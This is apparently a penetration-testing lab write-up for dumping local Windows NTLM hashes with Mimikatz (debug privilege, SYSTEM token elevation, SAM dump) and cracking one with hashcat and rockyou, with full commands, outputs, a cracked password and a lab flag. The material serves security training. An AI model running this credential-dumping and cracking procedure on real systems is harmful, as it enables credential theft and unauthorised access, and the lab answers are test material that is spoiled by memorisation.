# Cracking NTLM

Showing all local users in PowerShell
>``` shell
>PS C:\Users\offsec> Get-LocalUser
>
># ========== Expected Result ==========
>Name               Enabled Description
>----               ------- -----------
>Administrator      False   Built-in account for administering the computer/domain
>DefaultAccount     False   A user account managed by the system.
>Guest              False   Built-in account for guest access to the computer/domain
>nelly              True
>offsec             True
>WDAGUtilityAccount False   A user account managed and used by the system for Windows Defender Application Guard scen...
>...
># =====================================
>```

Start PowerShell as Administrator
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Cracking-NTLM-1.png)

Starting Mimikatz
>``` shell
>PS C:\Windows\system32> cd C:\tools
>
>PS C:\tools> ls
>
># ========== Expected Result ==========
>    Directory: C:\tools
>
>
>Mode                 LastWriteTime         Length Name
>----                 -------------         ------ ----
>-a----         5/31/2022  12:25 PM        1355680 mimikatz.exe
># =====================================
>
>PS C:\tools> .\mimikatz.exe
>
># ========== Expected Result ==========
>  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
> .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
> ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
> '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
>  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
>
>mimikatz #
># =====================================
>```

Enabling SeDebugPrivilege, elevating to SYSTEM user privileges and extracting NTLM hashes
>``` shell
>mimikatz # privilege::debug
>
># ========== Expected Result ==========
>Privilege '20' OK
># =====================================
>
>mimikatz # token::elevate
>
># ========== Expected Result ==========
>Token Id  : 0
>User name :
>SID name  : NT AUTHORITY\SYSTEM
>
>656     {0;000003e7} 1 D 34811          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
> -> Impersonated !
> * Process Token : {0;000413a0} 1 F 6146616     MARKETINGWK01\offsec    S-1-5-21-4264639230-2296035194-3358247000-1001  (14g,24p)       Primary
> * Thread Token  : {0;000003e7} 1 D 6217216     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
># =====================================
>
>mimikatz # lsadump::sam
>
># ========== Expected Result ==========
>Domain : MARKETINGWK01
>SysKey : 2a0e15573f9ce6cdd6a1c62d222035d5
>Local SID : S-1-5-21-4264639230-2296035194-3358247000
> 
>RID  : 000003e9 (1001)
>User : offsec
>  Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
> 
>RID  : 000003ea (1002)
>User : nelly
>  Hash NTLM: 3ae8e5f0ffabb3a627672e1600f1ba10
>...
># =====================================
>```

NTLM hash of user nelly in nelly.hash
>``` shell
>kali@kali:~/passwordattacks$ cat nelly.hash
>
># ========== Expected Result ==========
>3ae8e5f0ffabb3a627672e1600f1ba10
># =====================================
>```

Hashcat mode for NTLM hashes
>``` shell
>kali@kali:~/passwordattacks$ hashcat --help | grep -i "ntlm"
>
># ========== Expected Result ==========
>   5500 | NetNTLMv1 / NetNTLMv1+ESS                           | Network Protocol
>  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                      | Network Protocol
>   5600 | NetNTLMv2                                           | Network Protocol
>  27100 | NetNTLMv2 (NT)                                      | Network Protocol
>   1000 | NTLM                                                | Operating System
># =====================================
>```

NTLM hash of user nelly in nelly.hash and Hashcat mode
>``` shell
>kali@kali:~/passwordattacks$ hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force
>
># ========== Expected Result ==========
>hashcat (v6.2.5) starting
>...
>3ae8e5f0ffabb3a627672e1600f1ba10:nicole1                  
>                                                          
>Session..........: hashcat
>Status...........: Cracked
>Hash.Mode........: 1000 (NTLM)
>Hash.Target......: 3ae8e5f0ffabb3a627672e1600f1ba10
>Time.Started.....: Thu Jun  2 04:11:28 2022, (0 secs)
>Time.Estimated...: Thu Jun  2 04:11:28 2022, (0 secs)
>Kernel.Feature...: Pure Kernel
>Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
>Guess.Mod........: Rules (/usr/share/hashcat/rules/best66.rule)
>Guess.Queue......: 1/1 (100.00%)
>Speed.#1.........: 17926.2 kH/s (2.27ms) @ Accel:256 Loops:77 Thr:1 Vec:8
>...
># =====================================
>```

RDP Connection as nelly
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Cracking-NTLM-2.png)

Lab 1 - Follow the steps outlined in this section and find the flag on the nelly user's desktop on VM #1 (MARKETINGWK01).
>``` shell
>xfreerdp /u:offsec /p:lab /v:192.168.213.210 /cert:ignore
>
># Run Powershell as administartor
>
>Get-LocalUser
>
>cd C:\tools
>
>ls
>
>.\mimikatz.exe
>
>privilege::debug
>
>token::elevate
>
>lsadump::sam
>
>cat > nelly.hash << EOF
>3ae8e5f0ffabb3a627672e1600f1ba10
>EOF
>
>hashcat --help | grep -i ntlm
>
>hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt \
>-r /usr/share/hashcat/rules/best64.rule
>
>hashcat -m 1000 nelly.hash --show
>```
>OS{251d3e79de2a2f9ad4cb9551f18b6f81}

Lab 2 - Access VM #2 via RDP as user nadine with the password retrieved in the exercise of the section labeled "Password Manager" and leverage the methods from this section to extract Steve's NTLM hash. Use best66.rule for the cracking process and enter the plain text password as answer to this exercise.
>``` shell
>
>```
>
